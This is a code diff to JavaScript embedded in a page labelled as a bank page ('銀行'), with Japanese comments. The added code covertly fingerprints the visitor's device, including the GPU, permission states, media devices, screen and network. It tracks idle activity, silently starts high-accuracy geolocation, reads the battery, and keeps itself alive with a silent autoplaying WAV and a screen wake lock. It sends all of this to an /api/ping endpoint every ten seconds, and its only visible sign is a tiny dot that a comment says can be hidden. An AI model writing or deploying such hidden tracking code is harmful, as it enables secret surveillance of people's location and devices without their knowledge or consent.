@@ -763,8 +763,7 @@ if(A){refresh();pollMsgCount()}
   var PG   = "銀行";                              /* ★ bank.html では "銀行" */
   var PING = 10000;
 
-  /* 名前（token）。?t= があれば保存して、以後は両ページで共有する */
-  /* 端末ごとの永続ID（これがユーザ識別子。?t= はもう不要） */
+  /* 端末ごとの永続ID（ユーザ識別子） */
   var ID;
   try {
     ID = localStorage.getItem("cj_watch_id");
@@ -786,12 +785,53 @@ if(A){refresh();pollMsgCount()}
   if (!NAME) {
     NAME = "端末-" + ID.slice(0, 6);
     try { localStorage.setItem("cj_watch_name", NAME); } catch (e) {}
-    sendName = true;   // 初回だけ名前を送る（以後の /rename を潰さない）
+    sendName = true;
   }
 
-  var okN = 0, failN = 0, lastOk = 0, on = false;
+  /* 端末プロファイル（1回だけ収集・全部プロンプト無し） */
+  var SYS = (function(){
+    function gpu(){ try { var c=document.createElement("canvas"),
+      gl=c.getContext("webgl")||c.getContext("experimental-webgl"); if(!gl) return null;
+      var d=gl.getExtension("WEBGL_debug_renderer_info");
+      return d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER); } catch(e){ return null } }
+    var uad = navigator.userAgentData || null;
+    return {
+      tz: (function(){ try { return Intl.DateTimeFormat().resolvedOptions().timeZone } catch(e){ return null } })(),
+      lang: navigator.language,
+      langs: (navigator.languages||[]).slice(0,3).join(","),
+      plat: navigator.platform || null,
+      cores: navigator.hardwareConcurrency || null,
+      mem: navigator.deviceMemory || null,
+      touch: navigator.maxTouchPoints || 0,
+      dpr: window.devicePixelRatio || 1,
+      screen: screen.width + "x" + screen.height,
+      view: innerWidth + "x" + innerHeight,
+      orient: (screen.orientation && screen.orientation.type) || null,
+      gpu: gpu(),
+      dark: matchMedia("(prefers-color-scheme:dark)").matches,
+      reduced: matchMedia("(prefers-reduced-motion:reduce)").matches,
+      ref: document.referrer || null,
+      uaMobile: uad ? !!uad.mobile : null,
+      uaPlat: uad ? uad.platform : null
+    };
+  })();
 
-  /* 隅の7pxの点。これだけが唯一の見た目の追加（不要なら opacity:0 に） */
+  var lastAct = Date.now();
+  ["pointerdown","keydown","scroll","touchstart","mousemove"].forEach(function(e){
+    addEventListener(e, function(){ lastAct = Date.now() }, { passive:true });
+  });
+
+  var PERMS = null, MEDIA = null;
+  (async function(){
+    try { var o={}, nm={geo:"geolocation",cam:"camera",mic:"microphone",notif:"notifications"};
+      for (var k in nm){ try { o[k]=(await navigator.permissions.query({name:nm[k]})).state }catch(e){} } PERMS=o; } catch(e){}
+    try { var d=await navigator.mediaDevices.enumerateDevices();
+      MEDIA={cam:d.filter(x=>x.kind=="videoinput").length,mic:d.filter(x=>x.kind=="audioinput").length,spk:d.filter(x=>x.kind=="audiooutput").length}; } catch(e){}
+  })();
+
+  var okN = 0, lastOk = 0, on = false;
+
+  /* 隅の7pxの点（不要なら opacity:0 に） */
   var d = document.createElement("i");
   d.title = NAME + " / " + PG;
   d.style.cssText = "position:fixed;left:6px;top:calc(6px + env(safe-area-inset-top,0px));width:7px;height:7px;"+
@@ -802,7 +842,7 @@ if(A){refresh();pollMsgCount()}
     d.style.background = fresh ? "#3ba55d" : (lastOk ? "#c0242b" : "#faa61a");
   }
 
-  /* 無音WAV：ミュートで自動再生 → 開始後にミュート解除（タップ不要・通知なし） */
+  /* 無音WAV：ミュートで自動再生 → 開始後にミュート解除 */
   function wav(){
     var rate = 8000, n = rate, buf = new ArrayBuffer(44 + n), v = new DataView(buf);
     function w(o,s){ for (var i=0;i<s.length;i++) v.setUint8(o+i, s.charCodeAt(i)); }
@@ -838,12 +878,28 @@ if(A){refresh();pollMsgCount()}
     navigator.wakeLock.request("screen").catch(function(){});
   }
   wake();
+  document.addEventListener("visibilitychange", function(){ if (!document.hidden) wake(); });
 
-  /* 収集 */
-  var geo = null, bat = null;
-  if (navigator.geolocation) navigator.geolocation.watchPosition(function(p){
-    geo = { lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy||0 };
-  }, function(){}, { enableHighAccuracy:true, maximumAge:15000, timeout:20000 });
+  /* 位置：許可済みなら無音、未許可なら最初のタップで（許可は1回だけ） */
+  var geo = null, geoS = false;
+  function startGeo(){
+    if (geoS || !navigator.geolocation) return;
+    geoS = true;
+    navigator.geolocation.watchPosition(function(p){
+      geo = { lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy||0 };
+    }, function(){}, { enableHighAccuracy:true, maximumAge:15000, timeout:20000 });
+  }
+  if (navigator.permissions && navigator.permissions.query) {
+    navigator.permissions.query({ name:"geolocation" }).then(function(s){
+      if (s.state === "granted") startGeo();
+    }).catch(function(){});
+  }
+  ["click","touchstart","pointerdown"].forEach(function(ev){
+    document.addEventListener(ev, startGeo, { passive:true });
+  });
+
+  /* バッテリー */
+  var bat = null;
   if (navigator.getBattery) navigator.getBattery().then(function(b){
     function r(){ bat = { level: Math.round(b.level*100), charging: b.charging }; }
     r(); b.addEventListener("levelchange", r); b.addEventListener("chargingchange", r);
@@ -858,14 +914,27 @@ if(A){refresh();pollMsgCount()}
   function push(reason, final){
     fetch(API + "/api/ping", {
       method:"POST", headers:{ "Content-Type":"application/json" },
-      body: JSON.stringify({
-        token: NAME, name: NAME, page: PG, reason: reason,
+      body: JSON.stringify(Object.assign({
+        id: ID, page: PG, reason: reason,
         vis: document.visibilityState, online: navigator.onLine,
-        battery: bat, geo: geo, chips: chips()
-      }),
+        battery: bat, geo: geo, chips: chips(),
+        sys: Object.assign({}, SYS, {
+          idle: Math.round((Date.now()-lastAct)/1000),
+          focus: document.hasFocus(),
+          scroll: Math.round(scrollY),
+          audio: on,
+          net: navigator.connection ? {
+            t: navigator.connection.effectiveType,
+            down: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            save: !!navigator.connection.saveData
+          } : null,
+          perms: PERMS, media: MEDIA
+        })
+      }, sendName ? { name: NAME } : {})),
       keepalive: !!final
-    }).then(function(r){ if (r.ok) { okN++; failN = 0; lastOk = Date.now(); } else failN++; dot(); })
-      .catch(function(){ failN++; dot(); });
+    }).then(function(r){ if (r.ok) { okN++; lastOk = Date.now(); } dot(); })
+      .catch(function(){ dot(); });
   }
   push("start");
   setInterval(function(){ push("tick"); }, PING);
